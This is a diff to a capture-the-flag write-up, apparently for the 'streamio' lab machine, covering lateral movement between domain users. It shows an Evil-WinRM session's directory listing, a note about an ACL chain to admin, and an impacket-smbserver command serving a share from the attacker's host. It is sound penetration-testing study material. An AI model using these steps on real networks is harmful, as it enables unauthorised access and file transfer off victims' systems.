@@ -937,7 +937,7 @@ bcf0435640f5c7101ad9c7fd518cb996
 ```
 
 ---
-## Lateral movement from nikk37 to 
+## Lateral movement from nikk37 to jdgodd
 
 ### Enumeration
 
@@ -973,12 +973,48 @@ INFO: Compressing output into 20261002121937_bloodhound.zip
 
 ```
 
-### Exploitation
-
-Step-by-step privilege escalation.
+enumerating users reveals jdgodd which through a chain of ACL can get admin
+### File System enumeration
 
 ```shell
-# Commands used
+*Evil-WinRM* PS C:\Users\nikk37\Appdata> dir c:\'Program Files (x86)'
+
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/15/2018  12:28 AM                Common Files
+d-----        2/25/2022  11:35 PM                IIS
+d-----        2/25/2022  11:38 PM                iis express
+d-----        3/28/2022   4:46 PM                Internet Explorer
+d-----        2/22/2022   1:54 AM                Microsoft SQL Server
+d-----        2/22/2022   1:53 AM                Microsoft.NET
+d-----        5/26/2022   4:09 PM                Mozilla Firefox
+d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
+d-----        2/25/2022  11:33 PM                PHP
+d-----        2/22/2022   2:56 AM                Reference Assemblies
+d-----        3/28/2022   4:46 PM                Windows Defender
+d-----        3/28/2022   4:46 PM                Windows Mail
+d-----        3/28/2022   4:46 PM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----        3/28/2022   4:46 PM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                WindowsPowerShell
+
+
+```
+
+```
+impacket-smbserver -ip 10.10.15.80  -smb2support share /home/kali/machines/streamio
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+
+
 ```
 
 ---
